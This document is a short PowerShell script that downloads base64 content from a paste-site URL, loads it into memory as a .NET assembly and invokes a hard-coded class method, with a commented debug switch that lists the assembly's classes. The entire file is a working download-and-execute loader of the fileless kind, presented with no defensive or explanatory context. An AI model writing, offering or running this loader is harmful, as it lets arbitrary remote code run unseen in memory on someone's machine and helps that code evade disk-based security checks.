$string = (Invoke-WebRequest "https://paste.bingner.com/paste/3kh35/raw" -UseBasicParsing ).Content
$bytes = [System.Convert]::FromBase64String($string)
Start-Sleep -Seconds 1
$assembly = [System.Reflection.Assembly]::Load($bytes)

if (1 -eq 0) { # Change this to (1 -eq 1) to enable debug mode!
  $allClasses = $assembly.GetTypes()
  if ($allClasses.Count -gt 0) {
      Write-Host "Classes on assembly:"
      foreach ($class in $allClasses) {
          Write-Host $class.FullName
      }
  } else {
      Write-Host "No class found."
  }
} else {
  $className = "ClassLibrary1.A" # Class to load!
  $methodName = "main" # Method to load!
  $targetType = $assembly.GetType($className)
  if ($targetType -ne $null) {
      $method = $targetType.GetMethod($methodName, [Reflection.BindingFlags] 'Public, Static')
      if ($method -ne $null) {
          $result = $method.Invoke($null, @())
          if ($result -ne $null) {
              Write-Host "Result: $result"
          }
      } else {
          Write-Host "Method '$methodName' not found on class '$className'."
      }
  } else {
      Write-Host "Class '$className' not found on assembly."
  }
}